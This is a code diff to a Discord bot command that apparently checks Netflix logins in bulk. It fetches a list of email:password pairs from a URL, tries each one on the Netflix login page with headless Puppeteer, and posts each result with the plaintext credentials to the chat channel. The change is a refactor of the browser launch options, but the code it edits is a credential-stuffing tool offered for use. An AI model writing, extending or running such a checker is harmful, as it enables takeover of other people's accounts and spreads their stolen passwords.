@@ -2,22 +2,11 @@ const fs = require("fs");
 const { RichEmbed } = require("discord.js");
 const puppeteer = require("puppeteer");
 const fetch = require("node-fetch");
-const { getUserAgent } = require("../../utils");
+const { getUserAgent, getPuppeteerOptions } = require("../../utils");
 const { prefix } = require("../../config");
 
 const document = {};
 const URL = "https://www.netflix.com/login";
-
-const puppeteerOptions = {
-  args: [
-    "--disable-gpu",
-    "--disable-dev-shm-usage",
-    "--disable-setuid-sandbox",
-    "--no-first-run",
-    "--no-sandbox",
-    "--no-zygote"
-  ]
-};
 
 const getCredentials = url => fetch(url).then(res => res.text());
 
@@ -83,6 +72,7 @@ const checkCredentials = async (
         message.channel.send(`${cred_status} -> ${email}:${password}`);
 
         await browser.close();
+        const puppeteerOptions = await getPuppeteerOptions();
         const newBrowser = await puppeteer.launch(puppeteerOptions);
         checkCredentials(
           { browser: newBrowser, credentials, message, msg },
@@ -105,6 +95,7 @@ const checkCredentials = async (
     // eslint-disable-next-line require-atomic-updates
     error_message = err;
     await browser.close();
+    const puppeteerOptions = await getPuppeteerOptions();
     const newBrowser = await puppeteer.launch(puppeteerOptions);
     checkCredentials(
       { browser: newBrowser, credentials, message, msg },
@@ -135,6 +126,7 @@ module.exports = {
       })
       .filter(val => !!val);
 
+    const puppeteerOptions = await getPuppeteerOptions();
     const browser = await puppeteer.launch(puppeteerOptions);
 
     return message.channel.send("Please wait...").then(async msg => {
